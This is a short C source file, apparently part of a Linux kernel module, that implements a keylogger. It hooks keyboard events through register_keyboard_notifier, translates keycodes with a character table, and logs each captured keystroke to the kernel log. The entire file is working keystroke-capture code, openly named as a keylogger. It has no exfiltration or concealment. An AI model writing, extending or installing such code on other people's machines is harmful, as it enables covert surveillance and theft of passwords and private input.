#include "keylogger.h"

const char CHARS_TABLE[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '?',
    '?', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '?',
    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '?', 'X',
    'X', '?', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', 'z'
};

static int on_key_event(struct notifier_block* nblock, unsigned long code, void* param){
	struct keyboard_notifier_param* kn_param = param;
	int value = kn_param->value - KEY_1;
	if(value >=0 && value < sizeof(CHARS_TABLE))
		printk(KERN_INFO "Char is %c\n", CHARS_TABLE[value]);
	return NOTIFY_OK;
}
struct notifier_block key_notifier = {
	.notifier_call = on_key_event
};

int start_keylogger(void){
	register_keyboard_notifier(&key_notifier);
	return 0;
}

int stop_keylogger(void){
	unregister_keyboard_notifier(&key_notifier);
	return 0;
}
